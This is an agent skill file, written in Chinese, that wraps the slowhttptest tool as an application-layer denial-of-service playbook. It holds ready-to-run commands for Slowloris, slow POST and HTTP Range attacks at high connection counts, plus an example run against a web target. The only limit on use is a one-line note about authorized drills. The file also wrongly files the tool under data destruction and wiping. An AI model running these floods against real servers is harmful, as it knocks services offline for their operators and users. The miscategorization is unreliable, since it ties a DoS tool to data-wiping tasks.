---
name: slowhttptest-dos
description: slowhttptest: 慢速 HTTP 压测(授权演练)。信号:数据破坏,擦除,Slowloris 测试,Range 攻击,持续秒数。
---

# slowhttptest

- 攻击大类:C39 数据破坏与擦除
- 上游仓库:https://github.com/shekyan/slowhttptest
- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
apt install slowhttptest 或编译
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `-c 1000 -H -i 10 -r 200 -t GET -u https://t.com` | Slowloris 测试 |
| `-c 3000 -B -g -o body_stats -i 110 -r 200 -s 8192 -u URL` | Slow HTTP POST |
| `-c 8000 -R -u URL -r 200 -t POST` | Range 攻击 |
| `-l 300` | 持续秒数 |

## 攻击场景 Playbook

### 慢速 HTTP 压测(授权演练)

```bash
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://auth-target.com -l 120
# 低带宽拖垮 Web 服务器连接池,验证 WAF/限流策略有效性
```

## 注意事项

Application-Layer DoS 压测工具;仅用于授权的弹性验证场景。
